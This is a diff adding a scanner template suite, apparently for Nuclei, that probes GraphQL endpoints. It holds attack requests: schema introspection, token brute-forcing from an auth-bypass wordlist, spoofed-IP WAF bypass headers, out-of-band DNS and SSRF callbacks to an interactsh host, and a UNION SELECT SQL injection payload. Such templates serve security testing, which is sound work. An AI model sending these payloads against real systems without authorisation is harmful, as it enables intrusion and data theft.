@@ -1,0 +1,156 @@
+id: graphql-nuclei-suite
+
+tags: graphql, fuzz, token-bruteforce, introspection, apollo, graphene
+
+definitions:
+  common_paths:
+    - "/graphql"
+    - "/v1/graphql"
+    - "/graphql/v1"
+    - "/api/graphql"
+    - "/query"
+    - "/graphiql"
+    - "/graphql-playground"
+    - "/graphql-console"
+
+  introspection_payload:
+    query: |
+      {
+        __schema {
+          queryType { name }
+          mutationType { name }
+          subscriptionType { name }
+          types {
+            name
+            kind
+            description
+            fields { name }
+          }
+        }
+      }
+
+  token_headers:
+    - "Authorization: Bearer fuzz"
+    - "X-Auth-Token: fuzz"
+    - "X-API-Key: fuzz"
+    - "Authentication: fuzz"
+
+requests:
+
+  - template-id: graphql-introspection-post
+    method: POST
+    path: '{{BaseURL}}{{common_paths}}'
+    headers:
+      Content-Type: application/json
+    body: '{"query": "{{introspection_payload}}"}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '__schema'
+          - 'types'
+    extractors:
+      - type: json
+        name: types
+        internal: true
+        json:
+          - ".data.__schema.types[*].name"
+
+  - template-id: graphql-token-bruteforce
+    method: POST
+    path: '{{BaseURL}}{{common_paths}}'
+    headers:
+      Content-Type: application/json
+      fuzz-token: '{{token_headers}}'
+    payloads:
+      fuzz: helpers/wordlists/auth-bypass.txt
+    body: '{"query": "query { __typename }"}'
+    attack: pitchfork
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '__typename'
+
+  - template-id: graphql-framework-fingerprint
+    method: GET
+    path: '{{BaseURL}}{{common_paths}}'
+    matchers:
+      - type: word
+        part: body
+        condition: or
+        words:
+          - 'ApolloServer'
+          - 'Apollo GraphQL'
+          - 'Graphene'
+          - 'Express-GraphQL'
+          - 'Altair GraphQL'
+          - 'GraphQL Playground'
+          - 'Voyager'
+          - 'HyperGraphQL'
+
+  - template-id: graphql-json-introspection-heuristics
+    method: POST
+    path: '{{BaseURL}}{{common_paths}}'
+    headers:
+      Content-Type: application/json
+    body: '{"query": "{ __schema { types { name } } }"}'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '"__schema"\s*:\s*\{'
+
+  - template-id: graphql-waf-bypass
+    method: POST
+    path: '{{BaseURL}}{{common_paths}}'
+    headers:
+      Content-Type: application/json
+      X-Forwarded-For: 127.0.0.1
+      X-Originating-IP: 127.0.0.1
+      X-Remote-IP: 127.0.0.1
+      X-Client-IP: 127.0.0.1
+      X-HTTP-Method-Override: POST
+    body: '{"query": "{ __typename }"}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '__typename'
+
+  - template-id: graphql-dns-exfiltration
+    method: POST
+    path: '{{BaseURL}}{{common_paths}}'
+    headers:
+      Content-Type: application/json
+    body: '{"query": "query { users(filter: { email: \"test@{{interactsh-url}}\" }) { id } }"}'
+    matchers:
+      - type: dsl
+        dsl:
+          - interactsh_protocol == "dns"
+
+  - template-id: graphql-ssrf-chain
+    method: POST
+    path: '{{BaseURL}}{{common_paths}}'
+    headers:
+      Content-Type: application/json
+    body: '{"query": "{ avatar(url: \"http://{{interactsh-url}}\") { status } }"}'
+    matchers:
+      - type: dsl
+        dsl:
+          - interactsh_protocol == "http"
+
+  - template-id: graphql-sqli-chain
+    method: POST
+    path: '{{BaseURL}}{{common_paths}}'
+    headers:
+      Content-Type: application/json
+    body: '{"query": "{ search(term: \"test\') UNION SELECT version() --\") { id } }"}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PostgreSQL'
+          - 'MySQL'
+          - 'SQLite'
+          - 'sql syntax'
